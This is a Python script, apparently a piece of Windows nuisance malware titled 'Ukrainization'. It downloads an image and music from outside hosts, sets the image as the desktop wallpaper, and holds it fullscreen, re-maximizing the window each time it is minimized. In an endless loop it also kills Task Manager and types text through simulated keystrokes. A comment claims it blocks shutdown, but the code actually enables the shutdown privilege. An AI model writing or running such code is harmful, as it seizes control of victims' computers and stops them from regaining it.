import time
import keyboard
import pygame
import threading
from io import BytesIO
from PIL import Image
import urllib3
import pygetwindow
import os
import requests
import ctypes
import psutil
import win32security
import win32api
import win32con


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def play_music(music_url):
    song_file = "song.mp3"

    # Скачиваем песню
    response = requests.get(music_url, verify=False)
    with open(song_file, "wb") as f:
        f.write(response.content)

    pygame.mixer.init()
    pygame.mixer.music.load(song_file)
    pygame.mixer.music.play(-1)

def show_image(image_url):
    pygame.init()

    screen_info = pygame.display.Info()
    screen_width = screen_info.current_w
    screen_height = screen_info.current_h
    screen = pygame.display.set_mode((screen_width, screen_height), pygame.FULLSCREEN)
    pygame.display.set_caption("Ukrainization")
    response = requests.get(image_url, verify=False)
    image = Image.open(BytesIO(response.content))

    image = image.convert("RGB").resize((screen_width, screen_height))

    pygame_image = pygame.image.fromstring(image.tobytes(), image.size, "RGB")
    screen.blit(pygame_image, (0, 0))
    pygame.display.update()

    while True:
        for event in pygame.event.get():
            if event.type == pygame.ACTIVEEVENT:
                if event.state == 6:
                    print("Minimazed")

    pygame.quit()

def download_image(url, save_path):
    response = requests.get(url)
    if response.status_code == 200:
        with open(save_path, 'wb') as f:
            f.write(response.content)
        return True
    else:
        return False

def set_wallpaper(image_path):
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)

def kill_task_manager():
    for proc in psutil.process_iter():
        if proc.name() == "Taskmgr.exe":
            print("Диспетчер задач найден. Закрываю диспетчер задач...")
            proc.kill()
            print("Диспетчер задач успешно закрыт.")
            return
    print("Диспетчер задач не найден.")


if __name__ == "__main__":
    image_url = "https://img.freepik.com/free-vector/ukrainian-flag-pattern-vector_53876-162417.jpg"
    music_url = "https://muz8.z3.fm/d/18/gimn_ukraini_-_shche_ne_vmerla_ukrani_(zf.fm).mp3?download=force"
    filename = 'icon.ico'
    image_path = os.path.join(os.getcwd(), "wallpaper.ico")

    current_pid = win32api.GetCurrentProcessId()
    hProcess = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, current_pid)

    # Получаем дескриптор токена процесса
    hToken = win32security.OpenProcessToken(hProcess, win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY)

    # Запрещаем выключение компьютера через групповую политику
    SE_SHUTDOWN_NAME = 'SeShutdownPrivilege'
    shutdown_privilege = win32security.LookupPrivilegeValue(None, SE_SHUTDOWN_NAME)
    privileges = [(shutdown_privilege, win32security.SE_PRIVILEGE_ENABLED)]
    win32security.AdjustTokenPrivileges(hToken, False, privileges)



    if download_image(image_url, image_path):
        set_wallpaper(image_path)
        print("Обои успешно установлены!")
    else:
        print("Не удалось загрузить изображение.")

    music_thread = threading.Thread(target=play_music, args=(music_url,))
    image_thread = threading.Thread(target=show_image, args=(image_url,))

    music_thread.start()
    image_thread.start()
    time.sleep(1)
    window = pygetwindow.getWindowsWithTitle("Ukrainization")[0]
    while True:
        try:
            while True:
                if window.isMinimized == True:
                    window.maximize()
                    window.activate()
                    window.show()
                kill_task_manager()
                keyboard.write("Украинизация")

        except:
            ...

